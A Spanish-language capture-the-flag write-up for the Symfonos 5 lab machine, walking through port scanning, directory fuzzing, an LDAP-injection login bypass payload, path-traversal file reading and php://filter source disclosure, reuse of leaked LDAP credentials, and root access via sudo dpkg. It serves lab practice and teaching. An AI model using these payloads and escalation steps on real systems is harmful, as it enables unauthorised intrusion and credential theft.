---
title: "Symfonos 5"
layout: single
category: "Writeups"
slug: "writeups/symfonos-5"
date: 2025-09-30
---

# Symfonos 5
### Enumeracion
```bash
nmap 10.0.0.4 -p- -n -Pn -sS -sCV -T5 -oN scan  
```

```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 (RSA)
|   256 a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 (ECDSA)
|_  256 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
636/tcp open  ldapssl?
MAC Address: 00:0C:29:B7:25:27 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Visitamos la web y nos encontramos con una simple imagen, así que hacemos fuzzing con gobuster.
```bash
gobuster dir -u 'http://10.0.0.4' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php, html, txt, sh, pl, py 
```

```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.                    (Status: 200) [Size: 207]
/.php                 (Status: 403) [Size: 273]
/home.php             (Status: 302) [Size: 0] [--> admin.php]
/admin.php            (Status: 200) [Size: 1650]
/static               (Status: 301) [Size: 305] [--> http://10.0.0.4/static/]
/logout.php           (Status: 302) [Size: 0] [--> admin.php]
/portraits.php        (Status: 200) [Size: 165]
/.                    (Status: 200) [Size: 207]
/.php                 (Status: 403) [Size: 273]
/server-status        (Status: 403) [Size: 273]

```

### LDAP Injection
En el panel de admin, se probaron:
* Credenciales tipicas
* SQL injection
* Fuerza bruta

Pero la única que dio resultado, fue *LDAP Injection*, con Wfuzz y un diccionario que se encuentra en el apartado de *Hacking Servicios > 389 LDAP*

Primero se pasó la petición por burpsuite y ésta luego por wfuzz poniendo el parámetro FUZZ en los campos username y password.
```bash
`wfuzz -c -z file,/ruta/al/diccionario -u 'http://10.0.0.4/admin.php?username=FUZZ&password=FUZZ'
```
```bash
## EL PARÁMETRO SIGUIENTE FUE EL QUE FUNCIONÓ PARA HACER EL LOGIN BYPASS
*))%00         
``` 

### Remote File Inclusion
Una vez dentro, nos redirige a *home.php* , no vemos nada interesante así que analizamos el código fuente y vemos lo siguiente:
```bash
 <li class="nav-item">
        <a class="nav-link" href="home.php?url=http://127.0.0.1/portraits.php">Portraits</a>
      </li>
```

En el campo *url* parece que hay un RFI, y es totalmente funcional, mostrando el /etc/passwd
```bash
http://10.0.0.4/home.php?url=../../../etc/passwd
```

Se analizó el admin.php utilizando wrappers en busca de información interesante y vemos lo siguiente:
```bash
http://10.0.0.4/home.php?url=php://filter/convert.base64-encode/resource=admin.php

Pasando el código por base64 -d, vemos:

$bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "qMDdyZh3cT6eeAWD");
```

### Intrusión
Realizamos una enumeración con nmap aprovechando las credenciales de admin y localizamos un usuario con su contraseña y accedemos a la máquina por ssh.
```bash
nmap 10.0.0.4 -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local", ldap.password="qMDdyZh3cT6eeAWD"'
```
```bash
userPassword: cetkKf4wCuHC9FET
mail: zeus@symfonos.local
```

### Escalada de privilegios
Probamos Sudo -l y vemos que podemos correr dpkg como root sin contraseña
```bash
eus@symfonos5:~$ sudo -l
Matching Defaults entries for zeus on symfonos5:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zeus may run the following commands on symfonos5:
    (root) NOPASSWD: /usr/bin/dpkg
```

Vamos a gtfobins y econtramos esto:
```bash
sudo dpkg -l
!/bin/sh
```

Lo ejecutamos, y hemos comprometido y escalado 100% en la máquina.
```bash
# whoami 
root
# cat proof.txt
 
                    Congrats on rooting symfonos:5!
  
                                   ZEUS
              *      .            dZZZZZ,       .          *
                                 dZZZZ  ZZ,
     *         .         ,AZZZZZZZZZZZ  `ZZ,_          *
                    ,ZZZZZZV'      ZZZZ   `Z,`\
                  ,ZZZ    ZZ   .    ZZZZ   `V
        *      ZZZZV'     ZZ         ZZZZ    \_              .
.              V   l   .   ZZ        ZZZZZZ          .
               l    \       ZZ,     ZZZ  ZZZZZZ,
   .          /            ZZ l    ZZZ    ZZZ `Z,
                          ZZ  l   ZZZ     Z Z, `Z,            *
                .        ZZ      ZZZ      Z  Z, `l
                         Z        ZZ      V  `Z   \
                         V        ZZC     l   V
           Z             l        V ZR        l      .
            \             \       l  ZA
                            \         C          C
                                  \   K   /    /             K
                          A    \   \  |  /  /              /
                           \        \\|/ /  /
   __________________________________\|/_________________________
            Contact me via Twitter @zayotic to give feedback!

# 

```









